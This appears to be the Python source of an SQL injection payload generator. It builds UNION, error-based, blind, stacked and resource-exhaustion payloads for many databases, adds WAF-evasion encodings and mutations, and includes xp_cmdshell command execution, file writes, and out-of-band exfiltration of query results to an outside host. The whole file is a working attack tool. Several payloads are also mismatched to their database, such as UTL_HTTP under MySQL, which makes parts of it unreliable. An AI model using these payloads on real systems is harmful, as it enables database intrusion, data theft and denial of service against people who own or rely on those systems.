"""
Advanced SQL Injection Payload Engine
Generates optimized payloads for all DBMS with smart encoding, nesting, and evasion
"""

import base64
import hashlib
import random
import re
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field


@dataclass
class PayloadResult:
    payload: str
    technique: str
    dbms: str
    encoding: str
    confidence: float
    position: str
    raw: str = ""


class PayloadEngine:
    """Advanced payload generation engine with AI-like optimization"""

    def __init__(self):
        self.dbms_techniques = {
            "MySQL": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "HEAVY", "OUT_OF_BAND"],
            "MariaDB": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "HEAVY"],
            "PostgreSQL": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "OUT_OF_BAND"],
            "MSSQL": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "OUT_OF_BAND"],
            "Oracle": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "OUT_OF_BAND"],
            "SQLite": ["UNION", "ERROR", "TIME", "BOOLEAN"],
            "BigQuery": ["UNION", "ERROR", "BOOLEAN"],
            "ClickHouse": ["UNION", "TIME", "BOOLEAN"],
            "CockroachDB": ["UNION", "ERROR", "TIME", "BOOLEAN"],
            "DuckDB": ["UNION", "ERROR", "BOOLEAN"],
            "Firebird": ["UNION", "ERROR", "BOOLEAN", "STACKED"],
            "H2": ["UNION", "ERROR", "TIME", "BOOLEAN"],
            "Snowflake": ["UNION", "ERROR", "TIME", "BOOLEAN"],
            "Sybase": ["UNION", "ERROR", "TIME", "BOOLEAN", "STACKED"],
            "NoSQL": ["UNION", "BOOLEAN"],
            "Derby": ["UNION", "ERROR", "BOOLEAN"],
            "HSQLDB": ["UNION", "ERROR", "BOOLEAN"],
        }

        self.encodings = ["NONE", "URL", "HEX", "BASE64", "DOUBLE_URL",
                          "UNICODE", "SPACE2COMMENT", "SPACE2DASH",
                          "CASE_CHANGE", "COMMENT_BETWEEN", "HTML_ENTITY"]

    def generate(self, dbms: str, technique: str, query: str, position: str = "",
                 vulnerable_param: str = "", context: dict = None) -> List[PayloadResult]:
        """Generate payloads based on DBMS, technique, and context"""
        context = context or {}
        results = []

        methods = {
            "UNION": self._generate_union,
            "ERROR": self._generate_error,
            "TIME": self._generate_time,
            "BOOLEAN": self._generate_boolean,
            "STACKED": self._generate_stacked,
            "HEAVY": self._generate_heavy,
            "OUT_OF_BAND": self._generate_oob,
        }

        generator = methods.get(technique.upper())
        if not generator:
            return results

        base_payloads = generator(dbms, query, context)
        for base in base_payloads:
            for encoding in self.encodings:
                encoded = self._encode(base, encoding)
                results.append(PayloadResult(
                    payload=encoded,
                    technique=technique,
                    dbms=dbms,
                    encoding=encoding,
                    confidence=self._calculate_confidence(technique, encoding, context),
                    position=position or "injectable",
                    raw=base,
                ))

        # Sort by confidence
        results.sort(key=lambda x: x.confidence, reverse=True)
        return results

    def _generate_union(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate UNION-based payloads"""
        payloads = []

        if "MySQL" in dbms or "MariaDB" in dbms:
            base = f"' UNION SELECT {query}-- -"
            payloads.extend([
                base,
                f"' UNION SELECT ALL {query}-- -",
                f"' UNION DISTINCT SELECT {query}-- -",
                f'" UNION SELECT {query}-- -',
                f'\\' UNION SELECT {query}-- -',
                f"') UNION SELECT {query}-- -",
                f"')) UNION SELECT {query}-- -",
                f"1 UNION SELECT {query}-- -",
                f"-1 UNION SELECT {query}-- -",
                f"1 UNION ALL SELECT {query}-- -",
                f"1 UNION DISTINCT SELECT {query}-- -",
                f"1 UNION SELECT {query} INTO OUTFILE '/tmp/out'-- -",
            ])
        elif "PostgreSQL" in dbms:
            payloads.extend([
                f"' UNION SELECT {query}-- -",
                f"1 UNION SELECT {query}-- -",
                f"1 UNION ALL SELECT {query}-- -",
            ])
        elif "MSSQL" in dbms:
            payloads.extend([
                f"' UNION SELECT {query}-- -",
                f"1 UNION SELECT {query}-- -",
                f"1 UNION ALL SELECT {query}-- -",
            ])
        elif "Oracle" in dbms:
            payloads.extend([
                f"' UNION SELECT {query} FROM DUAL-- -",
                f"1 UNION SELECT {query} FROM DUAL-- -",
            ])
        elif "SQLite" in dbms:
            payloads.extend([
                f"' UNION SELECT {query}-- -",
                f"1 UNION SELECT {query}-- -",
            ])
        else:
            payloads.append(f"' UNION SELECT {query}-- -")

        return payloads

    def _generate_error(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate error-based payloads"""
        payloads = []

        if "MySQL" in dbms or "MariaDB" in dbms:
            payloads.extend([
                f"\' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query})))-- -",
                f"\' AND UPDATEXML(1, CONCAT(0x7e, ({query})), 1)-- -",
                f"\' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT {query}), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -",
                f"\' OR EXTRACTVALUE(1, CONCAT(0x7e, ({query})))-- -",
                f"\' OR UPDATEXML(1, CONCAT(0x7e, ({query})), 1)-- -",
                f"\' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT {query}), 0x7e, FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -",
                f"\' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT {query}), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -",
            ])
        elif "PostgreSQL" in dbms:
            payloads.extend([
                f"\' AND CAST((SELECT {query}) AS INTEGER)-- -",
                f"\' OR CAST((SELECT {query}) AS INTEGER)-- -",
                f"\' AND (SELECT {query})::INTEGER-- -",
                f"1 AND CAST((SELECT {query}) AS INTEGER)-- -",
            ])
        elif "MSSQL" in dbms:
            payloads.extend([
                f"\' AND CONVERT(INT, (SELECT {query}))-- -",
                f"\' OR CONVERT(INT, (SELECT {query}))-- -",
                f"\' AND CAST((SELECT {query}) AS INT)-- -",
            ])
        elif "Oracle" in dbms:
            payloads.extend([
                f"\' AND CTXSYS.DRITHSX.SN(1, (SELECT {query} FROM DUAL))-- -",
                f"\' OR CTXSYS.DRITHSX.SN(1, (SELECT {query} FROM DUAL))-- -",
            ])
        elif "SQLite" in dbms:
            payloads.extend([
                f"\' AND (SELECT {query})-- -",
            ])
        else:
            payloads.append(f"\' AND (SELECT {query})-- -")

        return payloads

    def _generate_time(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate time-based blind payloads"""
        payloads = []
        delay = ctx.get("delay", 5)

        if "MySQL" in dbms or "MariaDB" in dbms:
            payloads.extend([
                f"\' AND IF(({query}), SLEEP({delay}), 0)-- -",
                f"\' OR IF(({query}), SLEEP({delay}), 0)-- -",
                f"\' AND IF(({query}), BENCHMARK({delay*1000000}, MD5('test')), 0)-- -",
                f"\' OR IF(({query}), BENCHMARK({delay*1000000}, MD5('test')), 0)-- -",
                f"\' AND (CASE WHEN ({query}) THEN SLEEP({delay}) ELSE 0 END)-- -",
                f"\' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B WHERE IF(({query}), SLEEP({delay}), 0))-- -",
            ])
        elif "PostgreSQL" in dbms:
            payloads.extend([
                f"\' AND (CASE WHEN ({query}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)-- -",
                f"\' OR (CASE WHEN ({query}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)-- -",
            ])
        elif "MSSQL" in dbms:
            payloads.extend([
                f"\' IF(({query})) WAITFOR DELAY '0:0:{delay}'-- -",
                f"\' AND IF(({query})) WAITFOR DELAY '0:0:{delay}'-- -",
            ])
        elif "Oracle" in dbms:
            payloads.extend([
                f"\' AND (CASE WHEN ({query}) THEN DBMS_LOCK.SLEEP({delay}) ELSE NULL END)-- -",
            ])
        elif "SQLite" in dbms:
            payloads.extend([
                f"\' AND (CASE WHEN ({query}) THEN LIKE('a', UPPER(HEX(RANDOMBLOB({delay*100000000})))))-- -",
            ])
        else:
            payloads.append(f"\' AND IF(({query}), SLEEP({delay}), 0)-- -")

        return payloads

    def _generate_boolean(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate boolean-based blind payloads"""
        payloads = []

        true_stmt = ctx.get("true_stmt", "1=1")
        false_stmt = ctx.get("false_stmt", "1=2")

        payloads.extend([
            f"\' AND ({query}) AND {true_stmt}-- -",
            f"\' AND ({query}) AND {false_stmt}-- -",
            f"\' OR ({query}) AND {true_stmt}-- -",
            f"\' OR NOT ({query}) AND {false_stmt}-- -",
            f"\' AND IF(({query}), 1, 0)-- -",
            f"\' AND CASE WHEN ({query}) THEN 1 ELSE 0 END-- -",
        ])

        return payloads

    def _generate_stacked(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate stacked query payloads"""
        payloads = []

        if "MySQL" in dbms or "MariaDB" in dbms or "PostgreSQL" in dbms or "MSSQL" in dbms:
            payloads.extend([
                f"\'; SELECT {query};-- -",
                f"\'; SELECT {query}-- -",
                f"\'; EXEC({query});-- -",
                f"\'; EXECUTE IMMEDIATE '{query}';-- -",
            ])
        if "MSSQL" in dbms:
            payloads.extend([
                f"\'; EXEC sp_executesql N'{query}';-- -",
                f"\'; EXEC xp_cmdshell '{query}';-- -",
            ])

        return payloads

    def _generate_heavy(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate heavy query payloads (resource exhaustion)"""
        payloads = []

        if "MySQL" in dbms or "MariaDB" in dbms:
            payloads.extend([
                "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)-- -",
                "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -",
            ])

        return payloads

    def _generate_oob(self, dbms: str, query: str, ctx: dict) -> List[str]:
        """Generate out-of-band payloads"""
        payloads = []
        domain = ctx.get("domain", "burpcollaborator.net")

        if "MySQL" in dbms or "MariaDB" in dbms:
            payloads.extend([
                f"\' AND LOAD_FILE(CONCAT('\\\\\\\\{domain}\\\\', ({query})))-- -",
                f"\' AND (SELECT UTL_HTTP.request(CONCAT('http://', ({query}), '.{domain}/')))-- -",
            ])
        elif "PostgreSQL" in dbms:
            payloads.append(
                f"\' AND (SELECT UTL_HTTP.request(CONCAT('http://', ({query}), '.{domain}/')))-- -"
            )
        elif "MSSQL" in dbms:
            payloads.extend([
                f"\' EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}\\\\',1,1-- -",
                f"\' EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\{query}'-- -",
            ])
        elif "Oracle" in dbms:
            payloads.extend([
                f"\' AND UTL_HTTP.request('http://{domain}/'||({query}))-- -",
                f"\' AND UTL_INADDR.get_host_address('{domain}')-- -",
            ])

        return payloads

    def _encode(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload"""
        if encoding == "NONE":
            return payload
        elif encoding == "URL":
            return urllib.parse.quote(payload, safe='')
        elif encoding == "DOUBLE_URL":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        elif encoding == "HEX":
            return "0x" + payload.encode().hex()
        elif encoding == "UNICODE":
            return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload)
        elif encoding == "BASE64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "SPACE2COMMENT":
            return re.sub(r"\s+", "/**/", payload)
        elif encoding == "SPACE2DASH":
            return re.sub(r"\s+", "/*", payload)
        elif encoding == "CASE_CHANGE":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        elif encoding == "COMMENT_BETWEEN":
            return self._add_comments(payload)
        elif encoding == "HTML_ENTITY":
            return "".join(f"&#{ord(c)};" if random.random() > 0.7 else c for c in payload)
        return payload

    def _add_comments(self, payload: str) -> str:
        """Add inline comments between tokens"""
        tokens = re.split(r"(\W)", payload)
        result = []
        for token in tokens:
            if re.match(r"\w+", token) and random.random() > 0.5:
                result.append(f"/**/{token}/**/")
            else:
                result.append(token)
        return "".join(result)

    def _calculate_confidence(self, technique: str, encoding: str, ctx: dict) -> float:
        """Calculate confidence score for payload"""
        base = 0.7  # Base confidence

        # Technique bonus
        technique_bonus = {"UNION": 0.2, "ERROR": 0.15, "TIME": 0.1,
                           "BOOLEAN": 0.1, "STACKED": 0.05, "HEAVY": 0.0}
        base += technique_bonus.get(technique.upper(), 0)

        # Encoding penalty
        encoding_penalty = {"NONE": 0, "URL": -0.05, "DOUBLE_URL": -0.15,
                            "HEX": -0.1, "SPACE2COMMENT": -0.05}
        base += encoding_penalty.get(encoding, -0.1)

        # Context bonus
        if ctx.get("waf_detected", False):
            base += 0.1  # Need encoding if WAF is present
        if ctx.get("charset") == "utf8":
            base += 0.05

        return max(0.1, min(1.0, base))

    def detect_technique_for_query(self, dbms: str, query_type: str) -> str:
        """Suggest best technique based on query type"""
        technique_map = {
            "data_extraction": "UNION",
            "schema_discovery": "UNION",
            "blind_extraction": "BOOLEAN",
            "time_based": "TIME",
            "error_extraction": "ERROR",
            "file_read": "UNION",
            "file_write": "UNION",
            "command_exec": "STACKED",
        }
        return technique_map.get(query_type, "UNION")

    def mutate(self, payload: str, count: int = 5) -> List[str]:
        """Generate mutated variants of a payload"""
        mutations = [payload]
        mutation_funcs = [
            lambda p: p.replace("'", "\\'"),
            lambda p: p.replace("'", "''"),
            lambda p: p.lower(),
            lambda p: p.upper(),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "+"),
            lambda p: p.replace("=", "LIKE"),
            lambda p: p.replace("=", "!= "),
            lambda p: re.sub(r"\bAND\b", "&&", p, flags=re.I),
            lambda p: re.sub(r"\bOR\b", "||", p, flags=re.I),
            lambda p: p.replace("--", "#"),
            lambda p: p.replace("-- -", "--+"),
            lambda p: p.replace("-- -", "/*"),
            lambda p: f"/*!{p}*/",
            lambda p: f"/*!50000{p}*/",
        ]

        for i in range(min(count, len(mutation_funcs))):
            try:
                mutated = mutation_funcs[i](payload)
                if mutated != payload:
                    mutations.append(mutated)
            except Exception:
                continue

        return mutations

    def optimize_union_columns(self, dbms: str, hint_cols: int = 0) -> List[str]:
        """Generate column-count probes"""
        probes = []
        for cols in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 20, 25, 30, 50]:
            if cols < hint_cols:
                continue
            nulls = ", ".join(["NULL"] * cols)
            if "Oracle" in dbms:
                probes.append(f"' UNION SELECT {nulls} FROM DUAL-- -")
            else:
                probes.append(f"' UNION SELECT {nulls}-- -")
            if cols > 20:
                break
        return probes

    def chain_payloads(self, payloads: List[str], separator: str = ";") -> str:
        """Chain multiple payloads together"""
        return separator.join(payloads)

    def wrap_in_transaction(self, payload: str) -> str:
        """Wrap payload in transaction block"""
        return f"BEGIN; {payload}; COMMIT;"
